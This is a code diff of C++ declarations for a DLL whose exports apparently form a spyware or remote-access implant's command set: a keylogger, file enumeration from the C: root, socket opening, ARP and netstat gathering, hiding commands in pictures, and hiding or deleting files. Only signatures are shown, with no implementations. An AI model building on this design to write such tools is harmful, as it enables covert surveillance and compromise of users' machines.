@@ -33,7 +33,7 @@ using namespace std;
 extern "C" {
 #ifdef EXPORTING_DLL
 	extern __declspec(dllexport) string RunNetstat(string nothing);
-	extern __declspec(dllexport) string GetAllFiles(string dir);
+	extern __declspec(dllexport) string GetAllFiles(string dir = "c:\\");
 	extern __declspec(dllexport) string OpenSocket(string ip_and_port);
 	extern __declspec(dllexport) string ChangeFile(string file);
 	extern __declspec(dllexport) string StartKeyLogger(string nothing);
@@ -45,7 +45,7 @@ extern "C" {
 	extern __declspec(dllexport) string OpenSocket(string ip_and_port);
 	extern __declspec(dllexport) string ChangeFile(string file);
 	extern __declspec(dllexport) string GetArpTable();
-	extern __declspec(dllexport) string StartKeyLogger(string nothing);
+	extern __declspec(dllexport) string StartKeyLogger(string sharedKey);
 	extern __declspec(dllexport) string StopKeyLogger(string nothing);
 	extern __declspec(dllexport) string HideMessageInPicture(string fileName_and_cmd);
 
@@ -59,7 +59,7 @@ string exec(string cmd);
 string getFilePermissions(perms p);
 bool ConnectToHost(const char *PortNo, const char* IPAddress, SOCKET* s);
 void CloseConnection(SOCKET s);
-void getAllFilesInDir(const string &dirPath, vector<MyFileClass> listOfFiles);
+vector<MyFileClass> getAllFilesInDir(const string &dirPath);
 string OpenSocketWithThread(std::string ip_and_port);
 string HideFileOrFolder(string file);
 string DeleteGivenFile(string file);
